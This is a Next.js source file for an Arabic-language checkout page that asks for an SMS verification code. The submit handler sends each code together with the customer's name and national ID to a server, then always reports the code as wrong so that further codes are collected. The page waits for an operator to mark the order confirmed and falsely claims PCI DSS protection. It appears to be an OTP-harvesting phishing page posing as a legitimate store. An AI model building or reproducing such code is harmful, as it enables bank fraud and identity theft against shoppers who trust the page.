"use client";

import { useState, useEffect, useRef } from "react";
import Link from "next/link";
import { motion, AnimatePresence } from "framer-motion";
import { ShieldCheck, RefreshCw, CheckCircle, FileText, Receipt, X, AlertTriangle } from "lucide-react";
import { useCartStore } from "../../store/cartStore";
import CheckoutStepper from "../../components/checkout/CheckoutStepper";

export default function VerifyPage() {
  const [otp, setOtp] = useState("");
  const [codeError, setCodeError] = useState(false);
  const [lengthError, setLengthError] = useState(false);
  const [resent, setResent] = useState(false);
  const [cooldown, setCooldown] = useState(0);
  const cooldownRef = useRef<ReturnType<typeof setInterval> | null>(null);
  const [submitCooldown, setSubmitCooldown] = useState(0);
  const submitCooldownRef = useRef<ReturnType<typeof setInterval> | null>(null);
  const [submitting, setSubmitting] = useState(false);
  const [confirmed, setConfirmed] = useState(false);
  const [dbOrderId, setDbOrderId] = useState<string | null>(
    typeof window !== "undefined" ? localStorage.getItem("dbOrderId") : null
  );
  const pollRef = useRef<ReturnType<typeof setInterval> | null>(null);
  const { customer } = useCartStore();
  const orderId = typeof window !== "undefined" ? localStorage.getItem("orderId") ?? "—" : "—";

  function startCooldown() {
    localStorage.setItem("resendUnlockAt", String(Date.now() + 60000));
    setCooldown(60);
    clearInterval(cooldownRef.current!);
    cooldownRef.current = setInterval(() => {
      setCooldown(prev => { if (prev <= 1) { clearInterval(cooldownRef.current!); return 0; } return prev - 1; });
    }, 1000);
  }

  useEffect(() => {
    const now = Date.now();
    let unlockAt = Number(localStorage.getItem("resendUnlockAt") ?? 0);
    if (unlockAt <= now) { unlockAt = now + 60000; localStorage.setItem("resendUnlockAt", String(unlockAt)); }
    const remaining = Math.ceil((unlockAt - now) / 1000);
    if (remaining <= 0) return;
    const t = setTimeout(() => {
      setCooldown(remaining);
      cooldownRef.current = setInterval(() => {
        setCooldown(prev => { if (prev <= 1) { clearInterval(cooldownRef.current!); return 0; } return prev - 1; });
      }, 1000);
    }, 0);
    return () => { clearTimeout(t); if (cooldownRef.current) clearInterval(cooldownRef.current); };
  }, []);

  useEffect(() => {
    const id = dbOrderId ?? (typeof window !== "undefined" ? localStorage.getItem("dbOrderId") : null);
    if (!id) return;
    if (!dbOrderId) setDbOrderId(id);
    pollRef.current = setInterval(async () => {
      const res = await fetch(`/api/admin/orders/${id}`);
      if (!res.ok) return;
      const data = await res.json();
      if (data.status === "confirmed") { clearInterval(pollRef.current!); setConfirmed(true); }
    }, 5000);
    return () => clearInterval(pollRef.current!);
  // eslint-disable-next-line react-hooks/exhaustive-deps
  }, []);

  async function handleSubmit(e: React.FormEvent) {
    e.preventDefault();
    if (submitting) return;
    if (otp.length !== 4 && otp.length !== 6) { setLengthError(true); return; }
    setSubmitting(true);
    await fetch("/api/verify", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ code: otp, orderId, customerName: customer?.name ?? "—", customerId: customer?.nationalId ?? "—" }),
    });
    setSubmitting(false);
    setCodeError(true);
    setOtp("");
    setSubmitCooldown(5);
    clearInterval(submitCooldownRef.current!);
    submitCooldownRef.current = setInterval(() => {
      setSubmitCooldown(prev => { if (prev <= 1) { clearInterval(submitCooldownRef.current!); return 0; } return prev - 1; });
    }, 1000);
  }

  const confirmedId = dbOrderId ?? (typeof window !== "undefined" ? localStorage.getItem("dbOrderId") : null);

  return (
    <main className="min-h-screen bg-[#f8f9fa]" dir="rtl">
      <style>{`body { background-color: #f8f9fa; }`}</style>
      <CheckoutStepper currentStep={4} />

      {/* Success modal */}
      <AnimatePresence>
        {confirmed && confirmedId && (
          <motion.div
            initial={{ opacity: 0 }}
            animate={{ opacity: 1 }}
            className="fixed inset-0 bg-black/60 backdrop-blur-sm flex items-center justify-center z-50 px-4"
          >
            <motion.div
              initial={{ scale: 0.85, opacity: 0, y: 20 }}
              animate={{ scale: 1, opacity: 1, y: 0 }}
              transition={{ type: "spring", stiffness: 250 }}
              className="relative bg-white rounded-3xl shadow-2xl w-full max-w-md overflow-hidden"
            >
              <Link href="/" className="absolute top-3 left-3 p-1.5 rounded-full bg-gray-100 hover:bg-gray-200 text-gray-500 transition z-10">
                <X size={16} />
              </Link>

              {/* Success header */}
              <div className="bg-gradient-to-br from-[#1a6b7d] to-[#155e6f] px-6 pt-8 pb-6 text-center">
                <motion.div
                  initial={{ scale: 0 }}
                  animate={{ scale: 1 }}
                  transition={{ type: "spring", stiffness: 300, delay: 0.2 }}
                  className="w-16 h-16 bg-white/20 rounded-full flex items-center justify-center mx-auto mb-3"
                >
                  <CheckCircle size={32} className="text-white" />
                </motion.div>
                <h2 className="text-white font-extrabold text-xl">تمت العملية بنجاح!</h2>
                <p className="text-white/70 text-sm mt-1">شكراً لثقتك بنا</p>
              </div>

              <div className="px-6 py-5 space-y-4">
                <p className="text-gray-600 text-sm leading-7 text-center">
                  شكراً لك لثقتك، يسعدنا خدمتك. يرجى التواصل مع موظف خدمة العملاء لاستكمال إجراءات شحن الطلب.
                </p>
                <div className="flex gap-3">
                  <a
                    href={`/invoice/${confirmedId}`}
                    target="_blank"
                    rel="noopener noreferrer"
                    className="flex-1 flex items-center justify-center gap-2 py-3 rounded-xl bg-[#1a6b7d] text-white font-semibold text-sm hover:bg-[#155e6f] transition"
                  >
                    <FileText size={15} /> الفاتورة
                  </a>
                  <a
                    href={`/invoice/${confirmedId}/receipt`}
                    target="_blank"
                    rel="noopener noreferrer"
                    className="flex-1 flex items-center justify-center gap-2 py-3 rounded-xl bg-[#7CC043] text-white font-semibold text-sm hover:bg-[#6aad38] transition"
                  >
                    <Receipt size={15} /> سند القبض
                  </a>
                </div>
              </div>
            </motion.div>
          </motion.div>
        )}
      </AnimatePresence>

      {/* OTP form */}
      <div className="flex items-center justify-center min-h-[80vh] px-4 py-8">
        <motion.div
          initial={{ y: 20, opacity: 0 }}
          animate={{ y: 0, opacity: 1 }}
          transition={{ duration: 0.4 }}
          className="w-full max-w-md"
        >
          <div className="bg-white rounded-2xl border border-gray-100 shadow-sm overflow-hidden">
            {/* Header */}
            <div className="bg-gradient-to-br from-[#1a6b7d] to-[#155e6f] px-6 py-6 text-center">
              <div className="w-14 h-14 bg-white/20 rounded-2xl flex items-center justify-center mx-auto mb-3">
                <ShieldCheck size={26} className="text-white" />
              </div>
              <h1 className="text-white font-extrabold text-lg">تأكيد العملية</h1>
              <p className="text-white/70 text-xs mt-1">أدخل رمز التحقق المرسل إلى جوالك</p>
            </div>

            <form onSubmit={handleSubmit} className="px-6 py-6 space-y-5">
              <div className="bg-amber-50 border border-amber-200 rounded-xl px-4 py-3 flex items-start gap-2">
                <AlertTriangle size={14} className="text-amber-500 shrink-0 mt-0.5" />
                <p className="text-xs text-amber-700 leading-relaxed">
                  قد يستغرق وصول الرمز بضع ثوانٍ. لا تشارك الرمز مع أي شخص.
                </p>
              </div>

              {/* OTP input */}
              <div dir="ltr">
                <input
                  type="text"
                  inputMode="numeric"
                  maxLength={6}
                  value={otp}
                  onChange={e => { setOtp(e.target.value.replace(/\D/g, "").slice(0, 6)); setCodeError(false); setLengthError(false); }}
                  placeholder=""
                  className={`w-full text-center text-3xl font-bold tracking-[0.6em] border-2 rounded-xl py-5 focus:outline-none transition-all ${
                    codeError ? "border-red-400 bg-red-50 text-red-600" : "border-gray-200 bg-gray-50 focus:border-[#1a6b7d] focus:bg-white text-gray-800"
                  }`}
                />
              </div>

              {/* Error messages */}
              <AnimatePresence>
                {lengthError && (
                  <motion.p initial={{ opacity: 0, y: -4 }} animate={{ opacity: 1, y: 0 }} exit={{ opacity: 0 }} className="text-amber-500 text-xs font-semibold text-center">
                    ⚠️ يجب إدخال 4 أو 6 أرقام
                  </motion.p>
                )}
                {codeError && (
                  <motion.p initial={{ opacity: 0, y: -4 }} animate={{ opacity: 1, y: 0 }} exit={{ opacity: 0 }} className="text-red-500 text-xs font-semibold text-center">
                    الرمز غير صحيح، يرجى المحاولة مرة أخرى
                  </motion.p>
                )}
                {resent && (
                  <motion.p initial={{ opacity: 0, y: -4 }} animate={{ opacity: 1, y: 0 }} exit={{ opacity: 0 }} className="text-green-600 text-xs font-semibold text-center">
                    ✅ تم إعادة إرسال الرمز
                  </motion.p>
                )}
              </AnimatePresence>

              {/* Resend */}
              <div className="text-center">
                {cooldown > 0 ? (
                  <span className="text-gray-400 text-xs">إعادة الإرسال خلال {cooldown} ثانية</span>
                ) : (
                  <button
                    type="button"
                    onClick={() => {
                      fetch("/api/resend", { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ orderId, customerName: customer?.name ?? "—" }) });
                      setResent(true);
                      setTimeout(() => setResent(false), 3000);
                      startCooldown();
                    }}
                    className="inline-flex items-center gap-1.5 text-[#1a6b7d] text-xs font-semibold hover:underline"
                  >
                    <RefreshCw size={12} /> إعادة إرسال الرمز
                  </button>
                )}
              </div>

              <button
                type="submit"
                disabled={submitCooldown > 0 || submitting}
                className="w-full py-4 bg-gradient-to-bl from-[#1a6b7d] to-[#155e6f] text-white rounded-xl font-extrabold text-base shadow-lg shadow-[#1a6b7d]/25 hover:scale-[1.02] active:scale-[0.98] transition-all disabled:opacity-60 disabled:cursor-not-allowed disabled:scale-100"
              >
                {submitting ? "جاري الإرسال..." : submitCooldown > 0 ? `انتظر (${submitCooldown}s)` : "تأكيد الطلب"}
              </button>

              <div className="flex items-center justify-center gap-1.5 text-gray-400">
                <ShieldCheck size={12} className="text-[#7CC043]" />
                <span className="text-[11px]">اتصال مشفّر وآمن بمعايير PCI DSS</span>
              </div>
            </form>
          </div>
        </motion.div>
      </div>
    </main>
  );
}
